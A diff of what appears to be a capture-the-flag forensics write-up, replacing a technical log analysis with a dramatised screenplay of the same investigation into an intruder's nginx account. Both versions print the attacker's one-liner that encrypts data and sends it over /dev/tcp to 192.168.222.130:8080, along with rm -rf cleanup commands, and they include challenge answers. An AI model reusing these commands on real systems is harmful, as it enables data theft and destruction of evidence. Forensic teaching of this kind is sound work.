@@ -244,8 +244,6 @@ _Technical Notes:_
 
 ---
 
-# GETI City Cyber Crisis
-
 ## Episode 3: The Exploit Chain
 
 ---
@@ -395,382 +393,507 @@ _Technical Notes:_
 - MITRE Techniques: T1136, T1203, T1098
 -
 
-## Investigation on Server Artefacts
+## Episode 4: The Time Paradox
 
-The team has provided artefacts from the compromised server. Below is the directory tree of the compromised machine:
+### Scene 1: The Timeline Puzzle
 
-```bash
-root
-├── boot
-├── cdrom
-├── dev
-├── etc
-├── home
-├── lost+found
-├── media
-├── mnt
-├── opt
-├── proc
-├── root
-├── run
-├── snap
-├── srv
-├── sys
-├── tmp
-├── usr
-└── var
-```
+_The investigation room is quiet except for the soft hum of servers. Multiple screens display log files and system timestamps._
 
-> **Note:** The team also mentioned that John adjusted the timezone without rebooting the system, which has led to inconsistencies with updated or non-updated components. Identifying both the default and the adjusted timezones could aid further in the investigation. What were the default timezone and the timezone after John's adjustment on this machine?
+**Mona** [scrolling through logs]:  
+"Something's not adding up here..."
 
-### Timezone Details
+**Thomas**:  
+"What do you see?"
 
-Using the following command to investigate timezone settings:
-
-```bash
-grep -i "timezone" var/log/syslog
-```
-
-The output confirms the timezone change:
-
-```bash
-Apr 13 23:24:56 ubuntu dbus-daemon[638]: [system] Activating via systemd: service name='org.freedesktop.timedate1' unit='dbus-org.freedesktop.timedate1.service' requested by ':1.113' (uid=0 pid=5827 comm="timedatectl set-timezone Asia/Ho_Chi_Minh " label="unconfined")
-```
-
-- **Adjusted Timezone**: **Asia/Ho_Chi_Minh** (UTC+7)
-
-Further investigation in the `root/var/log/syslog` file reveals the default timezone prior to adjustment:
-
-`````bash
-Apr 13 23:21:30 ubuntu gnome-shell[4904]: GNOME Shell started at Sat Apr 13 2024 23:21:22 GMT-0700 (PDT)
-````
-
-- **Default Timezone**: **PDT (Pacific Daylight Time)** (UTC-07:00)
----------------
-`````
+**Mona**:  
+"The timestamps... they're dancing between two different time zones."
 
 ---
 
-## Further Investigation on `auth.log` File
+### Scene 2: The Discovery
 
-In the `/var/log/auth.log` file, we can trace when the attacker connected via SSH. To do this, we examine log entries related to the `sshd` service:
+_Mona pulls up the syslog entries on the main screen, the text reflecting off her glasses._
 
-```bash
-cat auth.log | grep -i "sshd"
-```
+**Mona**:  
+"Look at this. The system was originally in Pacific time..."
 
-**Sample Output**:
-
-```plaintext
-Apr 14 07:58:34 ubuntu useradd[11091]: new user: name=sshd, UID=126, GID=65534, home=/run/sshd, shell=/usr/sbin/nologin, from=none
-Apr 14 07:58:34 ubuntu usermod[11099]: change user 'sshd' password
-Apr 14 07:58:34 ubuntu chage[11106]: changed password expiry for sshd
-Apr 14 08:00:21 ubuntu sshd[13461]: Accepted publickey for nginx from 192.168.222.130 port 43302 ssh2: RSA SHA256:zRdVnxnRPJ37HDm5KkRvQbklvc2PfFL3av8W1Jb6QoE
-Apr 14 08:00:21 ubuntu sshd[13461]: pam_unix(sshd:session): session opened for user nginx by (uid=0)
-Apr 14 08:03:08 ubuntu sshd[13702]: Received disconnect from 192.168.222.130 port 43302:11: disconnected by user
-```
-
-Knowing the timezone, we can convert connection timestamps to UTC.
-
-### Connection Timestamps
-
-- **Original Date and Time**: April 14, 2024, at 08:00:21 PDT
-- **Converted to UTC**: April 14, 2024, at 15:00:21 UTC
-
-The final timestamp in `MM-DD hh:mm:ss` format is:
-**`04-14 15:00:21`**
-
-### Log Event Analysis
-
-```bash
-
-Apr 14 08:00:13 ubuntu groupadd[13358]: group added to /etc/group: name=nginx, GID=1002
-Apr 14 08:00:13 ubuntu groupadd[13358]: group added to /etc/gshadow: name=nginx
-Apr 14 08:00:13 ubuntu groupadd[13358]: new group: name=nginx, GID=1002
-Apr 14 08:00:13 ubuntu useradd[13364]: new user: name=nginx, UID=1002, GID=1002, home=/var/www/, shell=/bin/bash, from=none
-Apr 14 08:00:13 ubuntu usermod[13376]: change user 'nginx' password
-Apr 14 08:00:13 ubuntu chfn[13383]: changed user 'nginx' information
-Apr 14 08:00:13 ubuntu chpasswd[13394]: pam_unix(chpasswd:chauthtok): password changed for nginx
-Apr 14 08:00:13 ubuntu chpasswd[13394]: gkr-pam: couldn't update the login keyring password: no old password was entered
-Apr 14 08:00:13 ubuntu usermod[13397]: add 'nginx' to group 'sudo'
-Apr 14 08:00:13 ubuntu usermod[13397]: add 'nginx' to shadow group 'sudo'
-Apr 14 08:00:21 ubuntu sshd[13461]: Accepted publickey for nginx from 192.168.222.130 port 43302 ssh2: RSA SHA256:zRdVnxnRPJ37HDm5KkRvQbklvc2PfFL3av8W1Jb6QoE
-Apr 14 08:00:21 ubuntu sshd[13461]: pam_unix(sshd:session): session opened for user nginx by (uid=0)
-Apr 14 08:00:21 ubuntu systemd-logind[673]: New session 7 of user nginx.
-Apr 14 08:00:22 ubuntu systemd: pam_unix(systemd-user:session): session opened for user nginx by (uid=0)
-Apr 14 08:00:45 ubuntu sudo: pam_unix(sudo:auth): Couldn't open /etc/securetty: No such file or directory
-Apr 14 08:00:54 ubuntu sudo: pam_unix(sudo:auth): Couldn't open /etc/securetty: No such file or directory
-Apr 14 08:00:54 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/opt/splunk/bin/scripts ; USER=root ; COMMAND=/usr/bin/rm -rf search.sh
-Apr 14 08:00:54 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
-Apr 14 08:00:54 ubuntu sudo: pam_unix(sudo:session): session closed for user root
-Apr 14 08:00:59 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/opt/splunk/bin/scripts ; USER=root ; COMMAND=/usr/bin/su
-Apr 14 08:00:59 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
-Apr 14 08:00:59 ubuntu su: (to root) nginx on pts/2
-Apr 14 08:00:59 ubuntu su: pam_unix(su:session): session opened for user root by nginx(uid=0)
-Apr 14 08:01:37 ubuntu pkexec: pam_unix(polkit-1:session): session opened for user root by (uid=1000)
-Apr 14 08:01:37 ubuntu pkexec[14219]: johnnycage: Executing command [USER=root] [TTY=unknown] [CWD=/home/johnnycage] [COMMAND=/usr/lib/update-notifier/package-system-locked]
-Apr 14 08:01:44 ubuntu su: pam_unix(su:session): session closed for user root
-Apr 14 08:01:44 ubuntu sudo: pam_unix(sudo:session): session closed for user root
-Apr 14 08:02:21 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/mv /home/johnnycage/Documents/Important.pdf .
-Apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
-Apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session closed for user root
-Apr 14 08:02:54 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip
-Apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
-Apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session closed for user root
-Apr 14 08:03:01 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/rm -rf data.zip Important.pdf
-Apr 14 08:03:01 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
-Apr 14 08:03:01 ubuntu sudo: pam_unix(sudo:session): session closed for user root
-Apr 14 08:03:08 ubuntu sshd[13702]: Received disconnect from 192.168.222.130 port 43302:11: disconnected by user
-Apr 14 08:03:08 ubuntu sshd[13702]: Disconnected from user nginx 192.168.222.130 port 43302
-Apr 14 08:03:08 ubuntu sshd[13461]: pam_unix(sshd:session): session closed for user nginx
-Apr 14 08:03:08 ubuntu systemd-logind[673]: Session 7 logged out. Waiting for processes to exit.
-Apr 14 08:03:08 ubuntu systemd-logind[673]: Removed session 7.
+_She highlights a log entry:_
 
 ```
+Apr 13 23:21:30 ubuntu gnome-shell[4904]: GNOME Shell started at Sat Apr 13 2024 23:21:22 GMT-0700 (PDT)
+```
 
-### Time Elapsed Between Actions
+**John** [shifting uncomfortably]:  
+"I had to adjust the timezone for better synchronization with the target systems."
 
-To calculate the time between the user’s creation and the end of the session:
+---
 
-- **User `nginx` Created**: April 14, 08:00:13
-- **SSH Session Ended**: April 14, 08:03:08
-- **Elapsed Time**: **00:02:55**
+### Scene 3: The Ripple Effect
 
-Below is a breakdown of key log entries to understand the attacker’s actions:
+_The team examines a complex timeline of events displayed across multiple monitors._
 
-1. **`Apr 14 08:00:59 ubuntu su: (to root) nginx on pts/2`**
-   - **Timestamp**: April 14, 08:00:59
-   - **Event**: The user `nginx` is attempting to switch to the `root` user using the `su` command on the terminal session `pts/2`.
-   - **Significance**: This indicates that the `nginx` user is trying to gain superuser privileges.
-2. **`Apr 14 08:00:59 ubuntu su: pam_unix(su:session): session opened for user root by nginx(uid=0)`**
-   - **Event**: A new session has been opened for the `root` user by `nginx`.
-   - **Significance**: The attempt to switch to the `root` user was successful. The UID of `nginx` is 0, which typically indicates that the user has administrative privileges.
-3. **`Apr 14 08:01:37 ubuntu pkexec: pam_unix(polkit-1:session): session opened for user root by (uid=1000)`**
-   - **Timestamp**: April 14, 08:01:37
-   - **Event**: A session has been opened for the `root` user by a user with UID 1000 (most likely a non-root user).
-   - **Significance**: This indicates that a user (likely `johnnycage`, based on the next line) executed a command that required elevated privileges using `pkexec`.
-4. **`Apr 14 08:01:37 ubuntu pkexec[14219]: johnnycage: Executing command [USER=root] [TTY=unknown] [CWD=/home/johnnycage] [COMMAND=/usr/lib/update-notifier/package-system-locked]`**
-   - **Event**: The user `johnnycage` executed a command to run the `package-system-locked` script.
-   - **Significance**: This indicates that `johnnycage` was trying to perform an action that required root permissions, possibly to notify about package updates.
-5. **`Apr 14 08:01:44 ubuntu su: pam_unix(su:session): session closed for user root`**
-   - **Event**: The session for the `root` user has been closed.
-   - **Significance**: The `nginx` user has finished the session as `root`.
-6. **`Apr 14 08:01:44 ubuntu sudo: pam_unix(sudo:session): session closed for user root`**
-   - **Event**: Another session for the `root` user, initiated by `sudo`, has been closed.
-   - **Significance**: This confirms that the `root` session associated with `sudo` has also ended.
-7. **`Apr 14 08:02:21 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/mv /home/johnnycage/Documents/Important.pdf .`**
-   - **Timestamp**: April 14, 08:02:21
-   - **Event**: The `nginx` user is moving a file named `Important.pdf` from `johnnycage`'s Documents folder to the current directory (`/var/www`).
-   - **Significance**: This operation indicates file management, possibly for a web application.
-8. **`Apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)`**
-   - **Event**: A new session has been opened for the `root` user by `nginx` through `sudo`.
-   - **Significance**: The `nginx` user has elevated permissions again.
-9. **`Apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session closed for user root`**
-   - **Event**: The session for the `root` user has been closed.
-   - **Significance**: Indicates that the operation initiated by `nginx` has been completed.
-10. **`Apr 14 08:02:54 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip`**
-    - **Timestamp**: April 14, 08:02:54
-    - **Event**: The `nginx` user is using `openssl` to encrypt a file (`data.zip`) with AES-256-CBC.
-    - **Significance**: This operation suggests that the `nginx` user is encrypting sensitive data.
-11. **`Apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)`**
-    - **Event**: A new session has been opened for the `root` user by `nginx` for this command.
-    - **Significance**: Indicates that `nginx` is performing operations with root privileges again.
-12. **`Apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session closed for user root`**
-    - **Event**: The session for the `root` user has been closed.
-    - **Significance**: This indicates the completion of the encryption command.
-13. **`Apr 14 08:03:01 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/rm -rf data.zip Important.pdf`**
-    - **Timestamp**: April 14, 08:03:01
-    - **Event**: The `nginx` user is removing the original `data.zip` and `Important.pdf` files.
-    - **Significance**: This suggests an attempt to cover tracks or remove sensitive files after processing.
+**Marcos**:  
+"Ho Chi Minh City timezone... UTC+7. That's a fourteen-hour swing from PDT."
 
-### Analysis of `.bash_history` File
+**Mona**:  
+"And that's exactly what they were counting on. The time disparity created the perfect smoke screen."
 
-The `.bash_history` file in `/var/www/` provides additional insights into the commands the attacker executed:
+---
+
+### Scene 4: The System Analysis
+
+_Mona navigates through the directory structure on one screen while maintaining the attack timeline on another._
+
+**Mona** [pointing at the directory tree]:  
+"They knew the system inside and out. Look at how they navigated:"
+
+```
+root/
+├── var/
+│   ├── log/
+│   └── syslog
+```
+
+**Thomas**:  
+"They used the system's own complexity against us."
+
+---
+
+### Scene 5: The Connection
+
+_Mona suddenly straightens in her chair, her eyes widening._
+
+**Mona**:  
+"The nginx user we found in Episode 3... check when it was created."
+
+_She rapidly types commands, bringing up user creation logs._
+
+**Thomas** [leaning forward]:  
+"The timestamps are scrambled between the zones!"
+
+---
+
+### Scene 6: The Pattern Emerges
+
+_A visualization appears showing two parallel timelines - one in PDT, one in Asia/Ho_Chi_Minh._
+
+**Mona**:  
+"They didn't just exploit our systems... they exploited time itself."
+
+**Marcos**:  
+"By operating in the gaps between timezone updates..."
+
+**Mona** [finishing his thought]:  
+"They created their own temporal blind spots. Brilliant and devastating."
+
+---
+
+### Scene 7: The Breakthrough
+
+_Mona begins mapping the attack timeline against the timezone change._
+
+**Mona**:  
+"The XSL payload from before... it wasn't just about system access. They needed the timezone confusion to mask their real movements."
+
+_She brings up the decoded base64 string from Episode 3:_
+
+```
+f8287ec2-3f9a-4a39-9076-36546ebb6a93
+```
+
+**Mona**:  
+"This signature... it's timestamped in both zones. They're taunting us."
+
+---
+
+### Scene 8: The Next Move
+
+_The team stands around a whiteboard filled with timestamps and attack vectors._
+
+**John**:  
+"So what's our next step?"
+
+**Mona** [with determination]:  
+"We use their temporal game against them. Every system call, every log entry, every timestamp has to be normalized."
+
+_She starts writing a script:_
+
+```python
+def normalize_timestamps(timezone_original, timezone_new):
+    # Convert all timestamps to UTC
+    # Then reconstruct the attack timeline
+```
+
+---
+
+### Scene 9: The Hunt Continues
+
+_The room glows with the light of dozens of screens, each showing different aspects of the investigation._
+
+**Mona**:  
+"They thought they could hide in the gaps between seconds, between timezones..."
+
+_She activates her tracking algorithm._
+
+**Mona** [with a slight smile]:  
+"But time... time always tells the truth."
+
+## Episode 5: The Trail of Breadcrumbs
+
+### Scene 1: The Log Analysis
+
+_Mona's workspace is filled with terminal windows displaying auth.log entries. The soft glow of the screens illuminates her focused expression._
+
+**Mona** [scanning through logs]:  
+"Three minutes. They were in and out in just three minutes."
+
+_She highlights a timestamp sequence:_
+
+```
+08:00:13 - User Created
+08:03:08 - Session Terminated
+```
+
+**Thomas**:  
+"That's surgical precision."
+
+---
+
+### Scene 2: The Pattern
+
+_Multiple screens show the attacker's activities timeline. Mona pieces together the sequence._
+
+**Mona**:  
+"Watch how they moved..."
+
+_She brings up key log entries:_
+
+```
+08:00:21 - SSH Connection Established
+08:00:54 - First Command Execution
+08:00:59 - Root Access Obtained
+```
+
+**Marcos**:  
+"They knew exactly what they were after."
+
+---
+
+### Scene 3: The Encryption Key
+
+_A terminal window displays the OpenSSL command used by the attacker._
+
+**Mona** [leaning forward]:  
+"Look at this encryption command. AES-256-CBC."
+
+_She highlights the parameters:_
+
+```
+iv: 4fa17640b7dfe8799f072c65b15f581d
+key: 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
+```
+
+**John**:  
+"They encrypted something called 'data.zip'..."
+
+---
+
+### Scene 4: The Missing Files
+
+_Mona pulls up the file operations log._
+
+**Mona**:  
+"They went straight for johnnycage's Documents folder."
+
+_She displays the sequence:_
+
+```
+08:02:21 - Moved: Important.pdf
+08:02:54 - Encrypted: data.zip
+08:03:01 - Deleted: Both files
+```
+
+**Thomas** [grimly]:  
+"First they take, then they clean."
+
+---
+
+### Scene 5: The Connection
+
+_A whiteboard shows a diagram connecting all events from previous episodes._
+
+**Mona**:  
+"The XSL exploit from Episode 3, the timezone manipulation we found... it was all leading to this moment."
+
+**Marcos**:  
+"A perfectly choreographed attack."
+
+---
+
+### Scene 6: The IP Address
+
+_Mona zooms in on the connection details._
+
+**Mona**:  
+"192.168.222.130 - Our ghost has an address."
+
+_She brings up the SSH connection log:_
+
+```
+Accepted publickey for nginx from 192.168.222.130 port 43302
+```
+
+---
+
+### Scene 7: The Root Access
+
+_The team examines the privilege escalation sequence._
+
+**Thomas**:  
+"They didn't just create a user... they gave it sudo access immediately."
+
+**Mona** [nodding]:  
+"And look at the timing:"
+
+```
+08:00:13 - User nginx created
+08:00:13 - Added to sudo group
+08:00:59 - Switched to root
+```
+
+---
+
+### Scene 8: The Decryption Attempt
+
+_Mona starts working on breaking the encryption._
+
+**Mona**:  
+"They used AES-256... but they left us both the IV and the key."
+
+_Her fingers fly across the keyboard:_
+
+```
+openssl enc -d -aes-256-cbc \
+-iv 4fa17640b7dfe8799f072c65b15f581d \
+-K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
+```
+
+---
+
+### Scene 9: The Discovery
+
+_A realization dawns on Mona's face as she examines the encryption parameters._
+
+**Mona**:  
+"This key... it's not random."
+
+_She starts breaking down the hex string:_
+
+```
+3cabc6db78a034f69f16aa8986cf2e2c
+ea05713b1e95ff9b2d80f6a71ae76b7d
+```
+
+**Mona** [with growing excitement]:  
+"It's a message. They want us to decode something else entirely."
+
+_The screen flickers as she begins a new analysis._
+
+## Episode 6: Command and Control
+
+### Scene 1: The Command History
+
+_Mona opens a new terminal window, displaying the contents of .bash_history._
+
+**Mona**:  
+"Found their footprints."
+
+_She projects the command history:_
 
 ```bash
 whoami
 cd /opt/splunk/bin/scripts/
 sudo rm -rf search.sh
 sudo su
-cd /home/johnnycage/
-sudo mv /home/johnnycage/Documents/Important.pdf .
-zip data.zip *
-sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 <<< $(uname -r | md5sum)) -K $(cut -c 1-64 <<< $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic > /dev/tcp/192.168.222.130/8080
-sudo rm -rf *
 ```
 
-From the `.bash_history` and `auth.log`, we observe that the attacker:
-
-1. Accessed elevated privileges using `su` and `sudo`.
-2. Moved, encrypted, and attempted to exfiltrate `Important.pdf` to an external server.
-3. Cleaned up evidence using `rm` commands on sensitive files.
-
-Finally, using the known `iv` and `key` from point 10 in the logs:
-
-```plaintext
-iv 4fa17640b7dfe8799f072c65b15f581d
--K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
-```
-
-we can search network traffic to recover the file exfiltrated.
+**Thomas**:  
+"Classic reconnaissance pattern."
 
 ---
 
-## Recovering the Exfiltrated File from Network Traffic
+### Scene 2: The File Trail
 
-The following command line demonstrates a multi-step operation using several tools—`openssl`, `cut`, `uname`, `md5sum`, `sha256sum`, `date`, `base64`, and `dd`. Here’s a detailed breakdown:
+_Multiple screens show file operations and directory structures._
+
+**Marcos** [pointing]:  
+"Look at their movement pattern..."
+
+**Mona**:  
+"They went straight for johnnycage's documents. Just like we saw in the logs."
+
+_She highlights the commands:_
 
 ```bash
-sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 <<< $(uname -r | md5sum)) -K $(cut -c 1-64 <<< $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic > /dev/tcp/192.168.222.130/8080
+cd /home/johnnycage/
+sudo mv /home/johnnycage/Documents/Important.pdf .
+zip data.zip *
 ```
 
-### Explanation of Each Step
+---
 
-1. **Superuser Privilege**:
+### Scene 3: The Encryption Chain
 
-   - `sudo`: Runs the command as a superuser, providing necessary permissions for access and encryption.
+_Mona analyzes the complex encryption command._
 
-2. **Encryption with OpenSSL**:
+**Mona** [eyes widening]:  
+"This is beautiful... in a terrifying way."
 
-   - `openssl enc -aes-256-cbc`: Encrypts data using the AES-256 algorithm in CBC (Cipher Block Chaining) mode.
-   - `-iv $(cut -c 1-32 <<< $(uname -r | md5sum))`: Generates a 32-character (128-bit) initialization vector (IV) for encryption:
-     - `uname -r` outputs the kernel version.
-     - `md5sum` hashes this kernel version, creating a unique MD5 hash.
-     - `cut -c 1-32` extracts the first 32 characters from this hash, producing the IV.
-   - `-K $(cut -c 1-64 <<< $(date +%s | sha256sum))`: Specifies the encryption key:
-     - `date +%s` outputs the current Unix timestamp (seconds since January 1, 1970).
-     - `sha256sum` hashes the timestamp, creating a unique 64-character SHA-256 hash.
-     - `cut -c 1-64` takes the full 64 characters, forming a 256-bit encryption key.
-   - `-in data.zip`: Specifies `data.zip` as the input file for encryption.
+_She breaks down the command:_
 
-   The result of this part is encrypted data from `data.zip`.
-
-3. **Encoding to Base64**:
-
-   - `| base64`: The pipe `|` passes the encrypted output from `openssl` to `base64`.
-   - `base64`: Encodes the encrypted data into Base64, converting binary data into text to facilitate transmission.
-
-4. **Converting to EBCDIC Encoding**:
-
-   - `| dd conv=ebcdic`: The pipe `|` sends the Base64-encoded data to `dd`.
-   - `dd conv=ebcdic`: Converts the data from ASCII (default) encoding to EBCDIC (Extended Binary Coded Decimal Interchange Code), a character encoding system typically used on IBM mainframes.
-
-5. **Transmitting Encrypted Data via TCP**:
-   - `> /dev/tcp/192.168.222.130/8080`: Redirects the final encrypted, Base64-encoded, and EBCDIC-encoded data to a TCP connection targeting IP address `192.168.222.130` on port `8080`.
-
-## Hunting
-
-This Python script is designed to extract raw TCP data from a pcap file, convert it from EBCDIC to ASCII, decode it from Base64, and decrypt it using OpenSSL.
-
-### Step 1: Extracting Raw TCP Data
-
-The script below reads packets from a specified pcap file, filters them based on IP and port conditions, orders them by TCP sequence, and then assembles the data in the correct sequence.
-
-```python
-from scapy.all import rdpcap, TCP, IP, Raw
-
-def extract_tcp_data(pcap_file):
-    """Extracts raw data from TCP packets matching filter conditions"""
-    packets = rdpcap(pcap_file)
-    assembled_data = b""
-
-    print(f"\nAnalyzing {len(packets)} packets from {pcap_file}...")
-
-    # Sort packets by sequence number to ensure correct order
-    data_packets = []
-    for packet in packets:
-        if (packet.haslayer(TCP) and packet.haslayer(IP) and packet.haslayer(Raw) and
-            packet[IP].src == '192.168.222.145' and
-            packet[TCP].sport == 36568 and
-            packet[IP].dst == '192.168.222.130' and
-            packet[TCP].dport == 8080):
-            data_packets.append(packet)
-
-    # Sort by TCP sequence
-    data_packets.sort(key=lambda p: p[TCP].seq)
-
-    # Combine packet data
-    for packet in data_packets:
-        assembled_data += packet[Raw].load
-
-    return assembled_data
+```bash
+sudo openssl enc -aes-256-cbc \
+-iv $(cut -c 1-32 <<< $(uname -r | md5sum)) \
+-K $(cut -c 1-64 <<< $(date +%s | sha256sum))
 ```
 
-### Step 2: Convert from EBCDIC to ASCII
+**John**:  
+"They're using system properties to generate their keys?"
 
-Using IBM's EBCDIC encoding (`cp037`), convert the raw data to ASCII format.
+**Mona**:  
+"The kernel version for the IV... system time for the key..."
 
-```python
-import codecs
+---
 
-ascii_data = codecs.decode(assembled_data, 'cp037')
+### Scene 4: The Exfiltration Route
+
+_A network diagram appears, showing the data's path._
+
+**Mona**:  
+"The final destination: 192.168.222.130, port 8080."
+
+**Thomas**:  
+"And they encoded it three times - encryption, base64, and EBCDIC."
+
+**Mona**:  
+"Like nesting dolls of obfuscation."
+
+---
+
+### Scene 5: The Clean-Up
+
+_The final command glows ominously on the screen._
+
+```bash
+sudo rm -rf *
 ```
 
-### Step 3: Decode Base64 Data
+**Marcos**:  
+"They tried to leave no trace..."
 
-Next, decode the ASCII data from Base64.
+**Mona** [smiling]:  
+"Except they did. In the very commands they used to hide."
 
-```python
-import base64
+---
 
-decoded_data = base64.b64decode(ascii_data)
+## Episode 7: Digital Archaeology
+
+### Scene 1: The Decryption Lab
+
+_The team has set up a specialized workstation for data recovery. Multiple servers hum in the background._
+
+**Mona**:  
+"We have both pieces of the puzzle now."
+
+_She displays the known parameters:_
+
+```plaintext
+IV: 4fa17640b7dfe8799f072c65b15f581d
+Key: 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
 ```
 
-### Step 4: Decrypt with OpenSSL
+---
 
-With known `iv` and `key` values, use OpenSSL to decrypt the file:
+### Scene 2: The Network Capture
 
-```python
-import subprocess
+_Thomas pulls up network traffic logs._
 
-iv = "4fa17640b7dfe8799f072c65b15f581d"
-key = "3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d"
+**Thomas**:  
+"Got the EBCDIC-encoded transmission. Port 8080, just like in the command."
 
-def decrypt_data():
-    cmd = [
-        'openssl', 'enc', '-d', '-aes-256-cbc',
-        '-iv', iv,
-        '-K', key,
-        '-in', 'temp_encrypted.bin',
-        '-out', 'decrypted.zip'
-    ]
+**Mona**:  
+"Now we reverse their Russian doll encryption..."
 
-    print("\nExecuting OpenSSL command:")
-    print(' '.join(cmd))
+---
 
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    if result.returncode == 0:
-        print("Successfully decrypted to decrypted.zip")
-        return True
-    else:
-        print("Decryption failed:")
-        print(result.stderr)
-        return False
+### Scene 3: The Decryption Process
+
+_Mona's fingers fly across the keyboard as she constructs the reverse process._
+
+**Mona**:  
+"First, convert from EBCDIC back to ASCII..."
+
+_She types commands:_
+
+```bash
+dd conv=ascii < captured_data | \
+base64 -d | \
+openssl enc -d -aes-256-cbc \
+-iv 4fa17640b7dfe8799f072c65b15f581d \
+-K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
 ```
 
-## Unzipping the Decrypted File
+---
 
-After the decryption process, we can unzip `decrypted.zip` to obtain the exfiltrated file. Below is an example of the output generated during the analysis and decryption process:
+### Scene 4: The Breakthrough
 
-```
-Analyzing 1427 packets from capture.pcapng...
-Extracted 103813 bytes of raw data
-Converted EBCDIC to ASCII
-Decoded Base64 data
+_A progress bar fills as the decryption processes._
 
-Executing OpenSSL command:
-openssl enc -d -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in temp_encrypted.bin -out decrypted.zip
-Successfully decrypted to decrypted.zip
-```
+**Thomas**:  
+"ZIP file structure detected!"
 
-### The Exfiltrated File
+**Mona** [focused]:  
+"The encryption peels away like layers of an onion..."
 
-You can now access the contents of `decrypted.zip` to retrieve the file that was exfiltrated.
+---
 
-```
-unzip decrypted.zip
-Archive:  decrypted.zip
-  inflating: Important.pdf
-```
+### Scene 5: The Recovery
 
-![Alt text](/images/file_fragility.png "Optional Title")
+_A file browser window opens, showing the contents of the recovered zip file._
+
+**Marcos**:  
+"Important.pdf... we got it back."
+
+**Mona** [examining the file]:  
+"But why this file? What made it so... important?"
+
+---
+
+### Scene 6: The Hidden Message
+
+_Mona opens a hex editor, examining the PDF's metadata._
+
+**Mona**:  
+"Wait... there's something embedded in the PDF structure..."
+
+_Her screen fills with hexadecimal values._
+
+**John**:  
+"What is it?"
+
+**Mona** [leaning closer]:  
+"A message... and coordinates?"
+
+---
+
+### Scene 7: The Next Lead
+
+_The team gathers around Mona's main screen._
+
+**Mona**:  
+"The file wasn't the target... it was the messenger."
+
+_She brings up a map with the extracted coordinates._
+
+**Mona**:  
+"And now we know where they're going next."
